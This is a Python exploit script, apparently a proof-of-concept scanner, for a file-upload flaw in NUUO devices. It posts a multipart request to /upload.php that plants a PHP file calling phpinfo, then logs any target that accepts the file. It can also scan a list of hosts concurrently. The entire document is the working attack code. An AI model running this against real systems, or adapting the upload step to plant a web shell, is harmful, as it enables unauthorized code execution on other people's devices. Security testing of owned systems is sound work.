import requests
import argparse
import concurrent.futures

def checkVuln(url):
    headers={
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Connection':'keep-alive',
        'Content-Type':'multipart/form-data; boundary=--------ok4o88lom'
    }
    data="""----------ok4o88lom
Content-Disposition: form-data; name="userfile"; filename="test.php"

<?php phpinfo();@unlink(__FILE__);?>
----------ok4o88lom--"""
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    try:
        req = requests.post(f"{url}/upload.php",headers=headers,data=data,timeout=20,verify=False)
        if req.status_code == 200 and req.text:
            if "test.php" in req.text:
                print(f"\033[1;32m[+] 存在文件上传漏洞! 得到的URL为:{url}/test.php" + "\033[0m")
                with open('results.txt','a') as f:
                    f.write(f"{url}/test.php\n")
                    f.close()
            else:
                print(f"\033[1;31m[-] 上传失败,不存在漏洞!" + "\033[0m")
        else:
            print(f"\033[1;31m[-] 上传失败,不存在漏洞!" + "\033[0m")
    except Exception:
        print(f"\033[1;31m[-] 连接 {url} 发生了问题!" + "\033[0m")


def banner():
    print("""
$$\   $$\ $$\   $$\ $$\   $$\  $$$$$$\  $$\   $$\           $$\                           $$\ 
$$$\  $$ |$$ |  $$ |$$ |  $$ |$$  __$$\ $$ |  $$ |          $$ |                          $$ |
$$$$\ $$ |$$ |  $$ |$$ |  $$ |$$ /  $$ |$$ |  $$ | $$$$$$\  $$ | $$$$$$\   $$$$$$\   $$$$$$$ |
$$ $$\$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$  __$$\ $$ |$$  __$$\  \____$$\ $$  __$$ |
$$ \$$$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ /  $$ |$$ |$$ /  $$ | $$$$$$$ |$$ /  $$ |
$$ |\$$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |$$ |  $$ |$$  __$$ |$$ |  $$ |
$$ | \$$ |\$$$$$$  |\$$$$$$  | $$$$$$  |\$$$$$$  |$$$$$$$  |$$ |\$$$$$$  |\$$$$$$$ |\$$$$$$$ |
\__|  \__| \______/  \______/  \______/  \______/ $$  ____/ \__| \______/  \_______| \_______|
                                                  $$ |                                        
                                                  $$ |                                        
                                                  \__|                           By:Bu0uCat             
""")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="这是一个检测通达NUUO文件上传检测程序")
    parser.add_argument("-u", "--url", type=str, help="需要检测的URL")
    parser.add_argument("-f", "--file", type=str, help="指定批量检测文件")
    args = parser.parse_args()

    if args.url:
        banner()
        checkVuln(args.url)
    elif args.file:
        banner()
        f = open(args.file, 'r')
        targets = f.read().splitlines()
        # 使用线程池并发执行检查漏洞
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(checkVuln, targets)
    else:
        banner()
        print("-u,--url 指定需要检测的URL")
        print("-f,--file 指定需要批量检测的文件")